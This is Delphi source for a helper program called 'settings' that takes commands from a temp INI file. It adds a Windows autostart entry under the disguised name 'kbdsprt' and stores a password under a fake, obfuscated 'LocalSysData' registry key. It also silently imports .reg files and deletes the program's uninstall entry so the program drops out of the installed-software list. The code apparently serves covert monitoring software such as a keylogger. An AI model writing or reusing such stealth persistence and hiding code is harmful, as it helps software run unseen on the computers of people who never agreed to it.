program settings;
uses Windows, Registry, iniFiles, ShlObj, SysUtils, ShellApi;
var reg     :TRegistry;
    ini     :TIniFile;
    APP_NAME, Action, SValue: string;
    PIDL: PItemIDList;
    TempPath: array[0..MAX_PATH] of Char;
    res: string;
    ExeName: string;
begin
  APP_NAME:=ParamStr(1);
  if APP_NAME = '' then exit;

  { All Users\Application Data }
   SHGetSpecialFolderLocation(0, CSIDL_COMMON_APPDATA, PIDL);
   if PIDL <> nil then
   begin
    SHGetPathFromIDList(PIDL, TempPath);
    res:= string(TempPath);
    GlobalFreePtr(PIDL)
   end;

  SValue:=res + '\' + APP_NAME + '\temp\prm.tmp';
  if not FileExists(SValue) then
   begin
    MessageBox(0, 'NO COMMAND!', 'Info', mb_Ok);
    exit;
   end;

  ini:=TIniFile.Create(SValue);
  reg := TRegistry.Create;
  reg.LazyWrite := false;
  reg.RootKey := HKEY_LOCAL_MACHINE;

  // autorun
  Action:=ini.ReadString('Run', 'Action', 'NO');
  if Action = 'ADD' then
   begin
    try
     reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run',false);
     ExeName:=ini.ReadString('Run', 'Value', '');
     if (reg.ReadString('kbdsprt') <> ExeName) then reg.WriteString('kbdsprt', ExeName);
     reg.CloseKey;
    except end;
   end;
  if (Action = 'DELETE') then
   begin
    try
     reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run',false);
     reg.DeleteValue('kbdsprt');
     reg.CloseKey;
    except end;
   end;

  // password
  Action:=ini.ReadString('PWD', 'Action', 'NO');
  if Action = 'ADD' then
    begin
    SValue:=ini.ReadString('PWD', 'Value', '');
    try
     reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\LocalSysData',true);
     reg.WriteString('rtsysA0FCC89A', SValue);
     reg.CloseKey;
    except end;
   end;
  if (Action = 'DELETE') then
   begin
    try
      reg.OpenKey('Software\Microsoft\Windows\CurrentVersion\LocalSysData',true);
      reg.DeleteValue('rtsysA0FCC89A');
      reg.CloseKey;
    except end;
   end;

  // installed program
  Action:=ini.ReadString('IP', 'Action', 'NO');
  if Action = 'ADD' then
    begin
    SValue:=ini.ReadString('IP', 'Value', '');

     if FileExists(SValue) then
      begin
        try
         ShellExecute(0, 'open', 'regedit.exe',
         PChar(Format('/s "%s"', [SValue])),'', SW_SHOWDEFAULT);
        except end;
      end;
   end;
  if (Action = 'DELETE') then
   begin
    try
     SValue:='Software\Microsoft\Windows\CurrentVersion\Uninstall\' + APP_NAME + '_is1';
     reg.DeleteKey(SValue);
    except end;
   end;

  ini.Free;
  reg.Free;

  DeleteFile(res + '\' + APP_NAME + '\temp\prm.tmp');
 end.
